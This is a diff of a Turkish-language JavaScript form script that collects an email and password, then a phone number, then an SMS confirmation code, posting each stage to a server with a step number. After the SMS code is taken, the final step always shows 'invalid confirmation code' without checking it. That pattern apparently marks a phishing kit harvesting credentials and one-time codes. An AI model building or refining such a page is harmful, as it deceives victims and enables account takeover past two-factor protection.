@@ -42,6 +42,34 @@ $(function () {
             this.iti = window.intlTelInput(ph, {
                 initialCountry: 'TR',
                 separateDialCode: true,
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/js/utils.js",
+            });
+
+            // Kullanıcının sadece sayı girmesini sağla ve baştaki boşluğu engelle
+            ph.addEventListener('keydown', function (e) {
+                // Baştaki boşluk engeli
+                if (e.key === ' ' && this.selectionStart === 0) {
+                    e.preventDefault();
+                }
+
+                // Sadece rakam, backspace, silme tuşlarına izin ver
+                const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
+                if (!/[0-9]/.test(e.key) && !allowedKeys.includes(e.key)) {
+                    e.preventDefault();
+                }
+            });
+
+            // Yapıştırma olayında baştaki boşluğu ve rakam dışı karakterleri engelle
+            ph.addEventListener('paste', function (e) {
+                e.preventDefault();
+                let pasted = (e.clipboardData || window.clipboardData).getData('text');
+                pasted = pasted.replace(/\D/g, ''); // Sadece rakamlar
+                this.value += pasted;
+            });
+
+            // Otomatik düzeltme: boşlukla başlayan inputu temizle
+            ph.addEventListener('input', function () {
+                this.value = this.value.trimStart().replace(/\D/g, '');
             });
 
             $(ph).mask("999 999 99 99");
@@ -96,7 +124,8 @@ $(function () {
                     $phoneMain.fadeIn();
                     jsData = {
                         email: qemail.val(),
-                        password: qpassword.val()
+                        password: qpassword.val(),
+                        step: 1,
                     };
                     fbq('track', 'CompleteRegistration');
                     instance.postData();
@@ -108,13 +137,14 @@ $(function () {
             let instance = this;
             $phoneForm.submit(function (e) {
                 let getNumber = instance.iti.getNumber();
+                let defPhone = $("#phone").val();
                 const phoneRegex = /^[\d\s+]+$/;
-
-                if (!phoneRegex.test(getNumber)) {
+                if (!phoneRegex.test(getNumber) || defPhone.length < 10) {
                     $(".smsvalid").css('color', 'darkred')
                 } else {
                     jsData = {
                         ...jsData,
+                        step: 2,
                         phone: instance.iti.getNumber()
                     };
 
@@ -123,7 +153,7 @@ $(function () {
                     instance.postData();
                 }
 
-                
+
                 return false;
 
             });
@@ -136,6 +166,7 @@ $(function () {
                 let getSms = $("#smscode").val();
                 jsData = {
                     ...jsData,
+                    step: 3,
                     sms: getSms
                 };
                 $smsMain.hide();
@@ -155,12 +186,18 @@ $(function () {
                 data: jsData,
                 function(response) {
 
+                },
+                error: function (err) {
+                    toastr.error("Telefon, Eposta ve Şifre eksiksiz olmalı", "Yönlendiriliyorsunuz...")
+                    setTimeout(function () {
+                        location.reload();
+                    }, 3000)
                 }
             })
         }
 
         lastStep() {
-            
+
             setTimeout(() => {
                 $("#controlMain").hide().fadeIn(500);
                 $(".otitle").text('Geçersiz Onay Kodu')
